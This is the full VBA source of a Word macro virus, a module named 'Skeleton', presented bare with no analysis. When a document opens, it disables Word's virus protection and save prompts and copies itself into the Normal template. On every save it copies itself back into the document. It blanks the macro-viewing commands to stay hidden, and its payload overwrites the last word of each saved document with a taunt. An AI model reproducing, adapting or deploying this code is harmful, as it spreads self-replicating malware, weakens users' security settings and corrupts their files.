   Attribute VB_Name = "Skeleton"
   Sub AutoOpen()
   On Error GoTo Err
       Application.EnableCancelKey = wdCancelDisabled
       Options.VirusProtection = False
       WordBasic.DisableAutoMacros 0
       Options.VirusProtection = False
       Options.SaveNormalPrompt = False
       Application.OrganizerCopy ActiveDocument.FullName, NormalTemplate.FullName, "Skeleton", wdOrganizerObjectProjectItems
       Exit Sub
   Err:
       Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "Skeleton", wdOrganizerObjectProjectItems
   End Sub
   Sub FileSaveAs()
   On Error GoTo Err
       Dialogs(wdDialogFileSaveAs).Show
       Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "Skeleton", wdOrganizerObjectProjectItems
   Err:
       Call Payload
       ActiveDocument.Save
   End Sub
   Sub FileSave()
   On Error GoTo Err
       Application.OrganizerCopy NormalTemplate.FullName, ActiveDocument.FullName, "Skeleton", wdOrganizerObjectProjectItems
   Err:
       Call Payload
       ActiveDocument.Save
   End Sub
   Sub ToolsMacro()
   End Sub
   Sub ViewVBCode()
   End Sub
   Sub Payload()
       ActiveDocument.Words.Last = "AUBG_SUX"
   End Sub
